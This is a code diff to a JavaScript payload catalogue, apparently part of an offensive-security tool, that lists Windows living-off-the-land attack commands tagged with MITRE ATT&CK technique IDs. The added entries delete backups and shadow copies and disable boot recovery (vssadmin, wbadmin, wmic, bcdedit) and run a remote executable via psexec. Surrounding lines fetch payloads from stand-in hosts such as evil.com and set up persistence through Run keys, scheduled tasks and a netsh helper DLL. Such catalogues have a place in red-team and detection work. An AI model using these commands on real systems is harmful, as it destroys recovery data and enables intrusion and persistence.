@@ -36,6 +36,58 @@ const PAYLOADS = {
             'desc': null,
         }
     },
+    'Delete Backups': {
+        'Wbadmin': {
+            'cmd': 'wbadmin delete backup',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': null,
+        },
+        'Wbadmin (Catalog)': {
+            'cmd': 'wbadmin delete catalog -quiet',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': 'The command below erases Windows Backup Catalog.',
+        },
+    },
+    'Delete Shadow Copies': {
+        'Bcdedit': {
+            'cmd': 'bcdedit /set {default} bootstatuspolicy ignoreallfailures;bcdedit /set {default} recoveryenabled no',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
+        },
+        'Diskshadow': {
+            'cmd': 'diskshadow delete shadows all',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': null,
+        },
+        'Vssadmin': {
+            'cmd': 'vssadmin delete shadows /all /quiet',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': null,
+        },
+        'Wmic': {
+            'cmd': 'wmic shadowcopy delete',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
+            'lolbas': null,
+            'desc': null,
+        },
+    },
     'Download': {
         'Certutil': {
             'cmd': 'certutil -urlcache -split -f http://example.com/evil.exe .\\evil.exe',
@@ -51,7 +103,7 @@ const PAYLOADS = {
             'adminRequired': false,
             'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
             'lolbas': null,
-            'desc': 'If you run it on Command Prompt, call "powershell" before the above command such as "powershell -nop iwr -uri ..."',
+            'desc': 'If you run it on Command Prompt, call "powershell" before the following command such as "powershell -nop iwr -uri ..."',
         },
         'Mshta': {
             'cmd': 'mshta https://evil.com/evil.exe',
@@ -69,7 +121,7 @@ const PAYLOADS = {
             'adminRequired': false,
             'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
             'lolbas': null,
-            'desc': 'If you run it on Commnad Prompt, call "powershell" before the above command such as "powershell -nop -c \"IEX((...".',
+            'desc': 'If you run it on Commnad Prompt, call "powershell" before the following command such as "powershell -nop -c \"IEX((...".',
         },
     },
     'Dump Credentials': {
@@ -115,6 +167,15 @@ const PAYLOADS = {
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
             'desc': 'This command executes arbitrary JavaScript code in the .hta file. The .hta file must consist of HTML source code.',
         },
+        'Psexec': {
+            'cmd': 'psexec \\\\example.local -accepteula evil.exe',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
+            'lolbas': null,
+            'desc': 'Replace \'example.local\' with the address or the computer name of the target system. Additionally, it may need to specify username (\'-u\') and password (\'-p\').',
+
+        },
         'Shell32': {
             'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c echo hello > hello.txt"',
             'cli': null,
@@ -125,14 +186,6 @@ const PAYLOADS = {
         },
     },
     'Execute DLL': {
-        'Netsh': {
-            'cmd': 'netsh add helper C:\\evil.dll',
-            'cli': null,
-            'adminRequired': true,
-            'mitre': {'id': 'T1546.007', 'url': 'https://attack.mitre.org/techniques/T1546/007/'},
-            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Netsh/',
-            'desc': 'The DLL file must contain the "InitHelperDll" function marked with \'__declspec(dllexport)\'. Once added, the "InitHelperDll" function will be executed each time the netsh command is run. This method is also used for establishing persistence.'
-        },
         'Rundll32': {
             'cmd': 'rundll32 evil.dll,EntryPoint',
             'cli': null,
@@ -231,7 +284,7 @@ const PAYLOADS = {
             'adminRequired': false,
             'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
-            'desc': 'The above command executes arbitrary JavaScript code in the .hta file embedded in the "file.txt". The .hta file must consist of HTML source code.',
+            'desc': 'The following command executes arbitrary JavaScript code in the .hta file embedded in the "file.txt". The .hta file must consist of HTML source code.',
         },
         'Wmic': {
             'cmd': 'wmic process call create "C:\\file.txt:evil.exe"',
@@ -249,17 +302,25 @@ const PAYLOADS = {
             'adminRequired': false,
             'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
-            'desc': 'The above command writes the code "regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll" to the "payload.bat" and embed it into the "file.docx". The "file.docx" must already exist in the system.',
+            'desc': 'The following command writes the code "regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll" to the "payload.bat" and embed it into the "file.docx". The "file.docx" must already exist in the system.',
         }
     },
     'Persistence': {
+        'Netsh': {
+            'cmd': 'netsh add helper C:\\evil.dll',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1546.007', 'url': 'https://attack.mitre.org/techniques/T1546/007/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Netsh/',
+            'desc': 'The DLL file must contain the "InitHelperDll" function marked with \'__declspec(dllexport)\'. Once added, the "InitHelperDll" function will be executed each time the netsh command is run.'
+        },
         'Reg (Unprivileged)': {
             'cmd': 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
             'lolbas': null,
-            'desc': null,
+            'desc': 'The commnad below will cause arbitrary executable file or command to run when the current user logs on.',
         },
         'Reg (Privileged)': {
             'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
@@ -267,7 +328,7 @@ const PAYLOADS = {
             'adminRequired': true,
             'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
             'lolbas': null,
-            'desc': null,
+            'desc': 'The commnad below will cause arbitrary executable file or command to run when any user on the system logs on.',
         },
         'Schtasks': {
             'cmd': 'schtasks /Create /SC ONLOGON /TN "My Task" /TR C:\\evil.exe /RU SYSTEM',
